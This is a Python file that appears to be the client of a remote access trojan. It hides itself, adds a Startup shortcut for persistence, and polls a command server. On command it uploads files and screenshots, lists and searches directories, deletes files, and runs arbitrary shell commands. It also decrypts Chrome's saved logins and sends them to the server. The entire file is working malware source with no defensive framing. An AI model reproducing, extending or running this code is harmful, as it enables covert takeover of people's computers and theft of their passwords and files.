import requests
import subprocess 
import time
import os
from datetime import datetime, timedelta
import pyautogui
import tempfile
import platform
import shutil
from math import ceil
import json
import base64
import win32crypt
from Crypto.Cipher import AES
import sqlite3

save = tempfile.mkdtemp("screen")
SERVER_IP_ADDRESS = "http://127.0.0.1:5000/"
if SERVER_IP_ADDRESS[-1] != '/':
    SERVER_IP_ADDRESS += '/'
response = ""

if platform.system() == 'Windows':
    from win32com.client import Dispatch
    import win32api
    import win32con
    win32api.SetFileAttributes('Client.py',win32con.FILE_ATTRIBUTE_HIDDEN)
    username = os.getlogin()
    destination = r'C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'.format(username)
    if 'Client.pyw - Shortcut.lnk' not in os.listdir(destination):
        path = os.path.join(destination, "Client.pyw - Shortcut.lnk")
        target = "" + os.getcwd() + r"\Client.pyw"
        icon = "" + os.getcwd() + r"\Client.pyw"
        for files in os.listdir():
            if files == "Client.pyw":
                shell = Dispatch('WScript.Shell')
                shortcut = shell.CreateShortCut(path)
                shortcut.Targetpath = target
                shortcut.IconLocation = icon
                shortcut.save()

def get_chrome_datetime(chromedate):
    converted_date = datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
    return converted_date.strftime('%d-%m-%Y %H:%M:%S')


def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""
        
        
def extract_chrome_saved_passwords():
    list_of_data = []
    local_state_path = r'C:\Users\{}\AppData\Local\Google\Chrome\User Data\Local State'.format(os.getlogin())
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    db_path = r'C:\Users\{}\AppData\Local\Google\Chrome\User Data\Default\Login Data'.format(os.getlogin())
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created,"\
        "date_last_used from logins order by date_created"
        )
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]        
        if username or password:
            list_of_data.append(f"Origin URL    : {origin_url}")
            list_of_data.append(f"Action URL    : {action_url}")
            list_of_data.append(f"Username      : {username}")
            list_of_data.append(f"Password      : {password}")
        else:
            continue
        if date_created != 86400000000 and date_created:
            list_of_data.append(f"Creation Date : {get_chrome_datetime(date_created)}")
        if date_last_used != 86400000000 and date_last_used:
            list_of_data.append(f"Last Used     : {get_chrome_datetime(date_last_used)}")
        list_of_data.append("")
    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass
    return "\n".join(list_of_data)



while True:
    try:
        params = {"path": os.getcwd()}
        req = requests.get(SERVER_IP_ADDRESS, params)
        response = req.text
    except Exception as e:
        pass
    else:
        try:
            if 'terminate' == response.strip().lower():
                shutil.rmtree(save)
                quit()
                break

            elif 'grab' in response and response.startswith('grab'):
                path = response[5:]

                if os.path.exists(path):
                    if '\\' in path:
                        fileName = path.split("\\")[-1]
                    else:
                        fileName = path
                    url = SERVER_IP_ADDRESS + 'store'
                    fo = open(path, 'rb')
                    files = {'file': fo}
                    r = requests.post(url, files = files)
                    fo.close()
                else:
                    post_response = requests.post(url = SERVER_IP_ADDRESS, data = '[-] Not able to find the file !')

            elif 'snapshot' == response.strip().lower():
                screenshot = pyautogui.screenshot()
                screenshot_name = r'\Screenshot_' + datetime.now().strftime('%d-%m-%Y_%H-%M-%S') + '.png'
                screenshot.save(save + screenshot_name)
                url = SERVER_IP_ADDRESS + 'store'
                fo = open(save + screenshot_name, 'rb')
                files = {'file': fo}
                r = requests.post(url, files = files)
                fo.close()
                
            elif 'search' in response and response.startswith('search'):
                response = response[7:]
                path, ext = response.split('*')
                list = ''
                for dirpath, dirname, files in os.walk(path):
                    for file in files:
                        if file.endswith(ext):
                            list = list + '\n' + os.path.join(dirpath, file)
                r = requests.post(SERVER_IP_ADDRESS, data = list)

            elif 'cd' in response and response.startswith('cd'):
                if len(response) == 2:
                    r = requests.post(SERVER_IP_ADDRESS, data = "Enter with Location")
                else:
                    directory = response[3:]
                    if directory == "Desktop":
                        os.chdir('C:\\Users\\' + username + '\\' + directory)
                    else:
                        os.chdir(directory)

            elif 'remove' in response and response.startswith('remove'):
                if len(response) == 6:
                    r = requests.post(SERVER_IP_ADDRESS, data = "Enter filename after remove")
                else:
                    filename = response[7:]
                    if os.path.exists(filename):
                        os.remove(filename)
                    else:
                        r = requests.post(SERVER_IP_ADDRESS, data= "The file does not exist")
            
            elif "ls" == response.lower().strip():
                all_files = []
                for i in os.scandir():
                    date_time_stamp = datetime.fromtimestamp(i.stat().st_mtime).strftime('%d-%m-%Y %H:%M')
                    if os.path.isdir(i):
                        all_files.append("{:<90} {}".format(i.name+"/", date_time_stamp))
                    else:
                        size = str(ceil(i.stat().st_size/1024))+" KB"
                        all_files.append("{:<90} {} {:>15}".format(i.name, date_time_stamp, size))
                list_of_files = "\n".join(all_files)
                r = requests.post(SERVER_IP_ADDRESS, data= list_of_files)

            elif 'system specs' == response.lower().strip():
                system_specs = 'System      : {}\nNode        : {}\nRelease     : {}\nVersion     : {}\n'\
                    'Machine     : {}\nProcessor   : {}\nInterpreter : {}'    
                system_specs = system_specs.format(
                                        platform.system(), platform.node(),
                                        platform.release(), platform.version(),
                                        platform.machine(), platform.processor(),
                                        platform.architecture()[0]
                                        )
                r = requests.post(SERVER_IP_ADDRESS, data= system_specs)

            elif 'chrome saved passwords' == response.lower().strip():
                if platform.system() == 'Windows':
                    chrome_passwords = extract_chrome_saved_passwords()
                else:
                    chrome_passwords = 'Machine is not Windows'
                r = requests.post(SERVER_IP_ADDRESS, data= chrome_passwords)

            else:
                CMD =  subprocess.Popen(response,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
                post_response = requests.post(url=SERVER_IP_ADDRESS, data=CMD.stdout.read()) 
                post_response = requests.post(url=SERVER_IP_ADDRESS, data=CMD.stderr.read())
        except Exception as e:
            pass

    time.sleep(1)
